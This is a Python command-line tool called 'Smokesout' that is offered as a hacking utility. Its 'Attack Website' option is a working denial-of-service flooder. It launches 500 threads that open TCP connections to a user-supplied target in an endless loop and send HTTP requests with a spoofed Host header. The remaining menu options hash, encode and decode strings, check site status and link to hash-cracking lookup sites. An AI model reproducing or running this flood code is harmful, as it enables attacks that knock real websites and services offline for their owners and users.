import threading
import socket
import time
import urllib.request
from urllib.error import HTTPError
import hashlib
import webbrowser
import base64
import re
from os import system, name

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


already_connected = 0


def clear():
    # for windows
    if name == 'nt':
        _ = system('cls')

        # for mac and linux(here, os.name is 'posix')
    else:
        _ = system('clear')
def main():
    clear()
    print(f"""{bcolors.FAIL}
   _____                 _                         _   
  / ____|               | |                       | |  
 | (___  _ __ ___   ___ | | _____  ___  ___  _   _| |_ 
  \___ \| '_ ` _ \ / _ \| |/ / _ \/ __|/ _ \| | | | __|
  ____) | | | | | | (_) |   <  __/\__ \ (_) | |_| | |_ 
 |_____/|_| |_| |_|\___/|_|\_\___||___/\___/ \__,_|\__|                                                                 
     {bcolors.ENDC}""")  # logo
    print("   Beta Version   |   Developed by bloos3rpent")
    print(f"""{bcolors.OKBLUE}
    [1] Attack Website
    [2] Check Website Status
    [3] Encode/Encrypt
    [4] Decode/Decrypt
    
    {bcolors.FAIL}[99] Exit
    {bcolors.ENDC}""")

    def ddos():
        target = input('target: ')
        port = int(input('port [80 by default]: ') or 80)
        verbose = int(input("Verbose (Does not affect the attack)[200 by default]: ") or 200)
        print("Attacking " + target + " in port " "%s" % (port))
        fake_ip = '182.21.20.32'

        time.sleep(3)
        print(f"{bcolors.OKBLUE}Attack started{bcolors.ENDC}")
        time.sleep(1)
        already_connected = 0

        def attack():
            while 1 > 0:
                try:

                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target, port))
                    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

                    global already_connected
                    already_connected += 1
                    packetssent = str(already_connected)

                    if already_connected % verbose == 0:
                        print(f"{bcolors.OKGREEN}packets sent: {bcolors.ENDC}" + packetssent)
                except:
                    print(f"{bcolors.FAIL}Connection Timeout server might be already down or check your internet connection{bcolors.ENDC}")

        for i in range(500):
            thread = threading.Thread(target=attack)
            thread.start()

    def ping():
        site = input("Check site status: ")
        print("Checking Status: " + site)
        time.sleep(1)

        try:
            status = urllib.request.urlopen("http://" + site).getcode()
            print(f"{bcolors.OKGREEN}Status: %s {bcolors.ENDC}" % (status))
        except urllib.error.HTTPError as err:
            print(f"{bcolors.FAIL} Status: %s {bcolors.ENDC}" % (err.code))
        except:
            print("error")

        main()

    def encrypt():
        clear()
        print(f"""{bcolors.OKBLUE}
----Decrypt Code----

    [1] MD5 Hash
    [2] SHA-256
    [3] 0xHex
    [4] 0bBinary
    [5] Base64
    
    {bcolors.FAIL}[99] Go Back
        {bcolors.ENDC}""")
        def ask():
            cipher = input(f"{bcolors.FAIL}Smokesout > {bcolors.ENDC}")
            if cipher == "1": #MD5 HASH
                string = input(f"{bcolors.OKGREEN}Enter String to Hash > {bcolors.ENDC}")
                hash_obj = hashlib.md5(string.encode())
                print(f"{bcolors.FAIL}MD5 Encrypted > {bcolors.OKGREEN}%s{bcolors.ENDC}" % (hash_obj.hexdigest()))
                a = input("Encrypt another? (y/n) > ")
                if a.lower() == "y":
                    encrypt()
                else:
                    clear()
                    main()
                encrypt()
            elif cipher == "2": #SHA-256
                string = input(f"{bcolors.OKGREEN}Enter String to Hash > {bcolors.ENDC}")
                hash_obj = hashlib.sha256(string.encode())
                print(f"{bcolors.FAIL}SHA-256 Encrypted > {bcolors.OKGREEN}%s{bcolors.ENDC}" % (hash_obj.hexdigest()))
                a = input("Encrypt another? (y/n) > ")
                if a.lower() == "y":
                    encrypt()
                else:
                    clear()
                    main()
                encrypt()
            elif cipher == "3":
                string = input(f"{bcolors.OKGREEN}Enter String to Encode > {bcolors.ENDC}")
                s = string.encode('utf-8')
                print(f"{bcolors.FAIL}0xHex Encoded > {bcolors.OKGREEN}0x%s{bcolors.ENDC}" % (s.hex()))
                a = input("Encrypt another? (y/n) > ")
                if a.lower() == "y":
                    encrypt()
                else:
                    clear()
                    main()
                encrypt()
            elif cipher == "4":

                string = input(f"{bcolors.OKGREEN}Enter String to Encode > {bcolors.ENDC}")
                byte_array = string.encode()

                binary_int = int.from_bytes(byte_array, "big")
                binary_string = bin(binary_int)

                print(f"{bcolors.FAIL}0bBinary Encoded > {bcolors.OKGREEN}%s{bcolors.ENDC}" % (binary_string))
                a = input("Encrypt another? (y/n) > ")
                if a.lower() == "y":
                    encrypt()
                else:
                    clear()
                    main()
                encrypt()
            elif cipher == "5":
                message = input(f"{bcolors.OKGREEN}Enter String to Encode > {bcolors.ENDC}")
                message_bytes = message.encode('ascii')
                base64_bytes = base64.b64encode(message_bytes)
                base64_message = base64_bytes.decode('ascii')

                print(f"{bcolors.FAIL}Base64 Encoded > {bcolors.OKGREEN}%s{bcolors.ENDC}" % (base64_message))
                a = input("Encrypt another? (y/n) > ")
                if a.lower() == "y":
                    encrypt()
                else:
                    clear()
                    main()
                encrypt()
            elif cipher == "99":
                clear()
                main()
            else:
                ask()
        ask()

    def decode():
        clear()
        print(f"""{bcolors.OKBLUE}
----Decrypt Code----
    
    [1] Decrypt Hash
    [2] 0xHex  Decode
    [3] 0bBinary Decode
    [4] Base64  Decode
    
    {bcolors.FAIL}[99] Back
        {bcolors.ENDC}""")
        def d_options():
            d_option = input("Encryption to Decrypt/Decode > ")
            if d_option == "1":
                clear()
                print(f"""{bcolors.OKBLUE}
----Hash Reverse Lookup Sites----

    [1] crackstation.net {bcolors.OKGREEN}(RECOMMENDED){bcolors.ENDC}{bcolors.OKBLUE}
    [2] md5online.org
    [3] md5decrypt.net
    [4] dcode.fr
    [5] hashes.com

----Redirection to sites don't work in Termux----
        {bcolors.FAIL}[99] Back
                {bcolors.ENDC}""")
                def askd():
                    dec_opt = input("Choose site > ")
                    if dec_opt == "1":
                        webbrowser.open("crackstation.net")
                    if dec_opt == "2":
                        webbrowser.open("md5online.org")
                    if dec_opt == "3":
                        webbrowser.open("md5decrypt.net")
                    if dec_opt == "4":
                        webbrowser.open("dcode.fr")
                    if dec_opt == "5":
                        webbrowser.open("hashes.com")
                    if dec_opt == "99":
                        clear()
                        decode()
                    else:
                        askd()
                askd()
            elif d_option == "2":
                string = input("Translate from 0xHex Format > ")
                line = re.sub('[0x]', '', string)
                hexForm = bytearray.fromhex(line).decode()
                print(f"{bcolors.FAIL}0xHex Decoded > {bcolors.ENDC}{bcolors.OKGREEN}%s{bcolors.ENDC}" % (hexForm))
                a = input("Decrypt Another? (y/n) > ")
                if a.lower() == "y":
                    decode()
                else:
                    clear()
                    main()
            elif d_option == "3":
                try:
                    string = input("0bBINARY format to decode > ")
                    binaryform = string[2:]
                    binary_int = int(binaryform, 2)
                    byte_number = binary_int.bit_length() + 7 // 8

                    binary_array = binary_int.to_bytes(byte_number, "big")
                    ascii_text = binary_array.decode()

                    print(f"{bcolors.FAIL}Decoded 0bBinary code > {bcolors.OKGREEN}%s{bcolors.ENDC}" % (ascii_text))

                    a = input("Decrypt Another? (y/n) > ")
                    if a.lower() == "y":
                        decode()
                    else:
                        clear()
                        main()
                except:
                    print(f"{bcolors.WARNING}Error{bcolors.ENDC}")
                    time.sleep(2)
                    clear()
                    decode()
            elif d_option == "4":
                base64_message = input("Base64 code to decode > ")
                base64_bytes = base64_message.encode('ascii')
                message_bytes = base64.b64decode(base64_bytes)
                message = message_bytes.decode('ascii')

                print(f"{bcolors.FAIL}Base64 decoded > {bcolors.OKGREEN}%s{bcolors.ENDC}" % (message))
            elif d_option == "99":
                clear()
                main()
            else:
                d_options()
                main()
            a = input("Decrypt Another? (y/n) > ")
            if a.lower() == "y":
                clear()
                decode()
            else:
                clear()
                main()
        d_options()

    def mainask():
        action = input(f"{bcolors.FAIL}Smokesout > {bcolors.ENDC}")
        if action == "1":
            ddos()
        elif action == "2":
            ping()
        elif action == "3":
            encrypt()
        elif action == "4":
            decode()
        elif action == "99":
            confirm = input("Do you want to exit? y/n: ")
            if confirm.lower() == "y":
                exit()
            else:
                main()
        else:
            mainask()
    mainask()
main()
